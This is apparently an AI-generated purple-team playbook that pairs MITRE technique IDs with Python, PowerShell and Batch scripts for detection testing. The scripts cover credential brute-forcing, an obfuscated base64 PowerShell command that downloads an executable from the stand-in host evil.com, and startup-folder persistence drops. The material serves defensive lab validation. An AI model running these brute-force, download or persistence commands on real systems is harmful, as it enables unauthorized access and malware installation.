# Purple Team Playbook - Multi-Platform Scripts

---

## ✅ 1️⃣ Purpose

Integrate **Python**, **PowerShell**, and **Batch** scripts for realistic, multi-platform attack simulation & detection validation.

---

## ✅ 2️⃣ Tools to Keep Ready

| Type | Tool | Example |
|------|------|---------|
| Python | Custom scripts, Atomic Red Team helpers | |
| PowerShell | Live TTP emulation, Windows-native | |
| Batch | Simple persistence, process spawners | |

---

## ✅ 3️⃣ Workflow (Recap)

1️⃣ Pick TTP

2️⃣ Script attack in Python/PowerShell/Batch

3️⃣ Run in isolated lab

4️⃣ Check SIEM/EDR for logs & alerts

5️⃣ Tune detection

6️⃣ Document and iterate

---

## ✅ 4️⃣ Example Playbook Entries

Below are practical examples for each script type.

---

### 🧩 Example 1 — Brute Force

| Item | Value |
|------|-------|
| **TTP ID** | T1110 (Brute Force) |
| **Goal** | Test login failure detection |
| **Method (Python)** | Try multiple password attempts |
| **Method (PowerShell)** | Loop failed `net use` |
| **Method (Batch)** | Automate repeated auth attempts |

---

### ✅ Python

```python
import requests
from requests.auth import HTTPBasicAuth

users = ["admin"]
passwords = ["1234", "password", "admin"]

for user in users:
    for pwd in passwords:
        r = requests.get(
            "http://target/login",
            auth=HTTPBasicAuth(user, pwd)
        )
        print(f"{user}:{pwd} -> {r.status_code}")
```

---

### ✅ PowerShell

```powershell
# Attempt network share connection with bad creds
$User = "admin"
$Passwords = @("1234", "password", "admin")

foreach ($pwd in $Passwords) {
    net use \\target\IPC$ /user:$User $pwd
}
```

---

### ✅ Batch

```batch
@echo off
set USER=admin
set PASSWORDS=1234 password admin

for %%P in (%PASSWORDS%) do (
    net use \\target\IPC$ /user:%USER% %%P
)
```

---

### 🧩 Example 2 — Suspicious PowerShell

| Item | Value |
|------|-------|
| **TTP ID** | T1059 |
| **Goal** | Test detection of obfuscated PowerShell |
| **Method (PowerShell)** | Base64-encoded command |
| **Method (Batch)** | Spawn PowerShell with encoded script |

---

### ✅ PowerShell

```powershell
# Encoded command to download file
$Command = 'Invoke-WebRequest -Uri http://evil.com/bad.exe -OutFile C:\temp\bad.exe'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
$Encoded = [Convert]::ToBase64String($Bytes)

powershell.exe -EncodedCommand $Encoded
```

---

### ✅ Batch

```batch
@echo off
REM Spawn PowerShell with encoded download command
powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AYgBhAGQALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAEMAOgBcAHQAZQBtAHAAXABiAGEAZAAuAGUAeABl
```

*(This string is the UTF-16 base64 version of `Invoke-WebRequest ...` above — can regenerate as needed.)*

---

### 🧩 Example 3 — Persistence via Startup (Batch)

| Item | Value |
|------|-------|
| **TTP ID** | T1547 |
| **Goal** | Validate detection of new startup entries |
| **Method (Batch)** | Drop script in startup folder |

---

### ✅ Batch

```batch
@echo off
REM Create a malicious batch file in startup folder
echo @echo Malicious Run >> %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\evil.bat
```

---

### ✅ PowerShell

```powershell
# Drop a startup script
$Path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\evil.ps1"
Set-Content $Path "Start-Process notepad.exe"
```

---

### 🧩 Example 4 — Python to Trigger SIEM Alert

```python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
syslog_server = ("192.168.1.100", 514)

message = "<134> LAB TEST: Detected Evil Activity!"
sock.sendto(message.encode(), syslog_server)
sock.close()
```

---

## ✅ 5️⃣ Reporting Template

| Field | Example |
|-------|---------|
| TTP | T1110 |
| Goal | Validate brute force detection |
| Tool | Python + PowerShell + Batch |
| Log Source | Auth logs |
| SIEM Rule | Multiple failed logins |
| Result | Pass |
| Notes | Lockout threshold adjusted |

---

## ✅ 6️⃣ Version Control

Store:

- `/scripts/python/`
- `/scripts/powershell/`
- `/scripts/batch/`
- `/docs/playbook.md`

Use `git` so you track edits & additions over time.

---

## ✅ 7️⃣ Next Steps

✔️ Build on this base:

- Add more TTPs (exfil, lateral movement)
- Expand each with PowerShell & Batch where practical
- Schedule routine runs via cron, Task Scheduler, or CI/CD pipelines

---

## ✅ 8️⃣ Import to Notion

- Use **Toggle Lists** for each TTP
- Create **Databases** for:
  - Scripts
  - Test results
  - Detection rules
  - Lessons learned

---

## ✅ Want It Ready?

👉 **I can:**

✅ Package this as:

- ✔️ **Notion export (.zip)**
- ✔️ **GitHub starter repo**
- ✔️ **Markdown docs with code files**

Just say **"Bundle the full Purple Team Playbook now!"** — and I'll deliver the complete kit! 🚀🔐
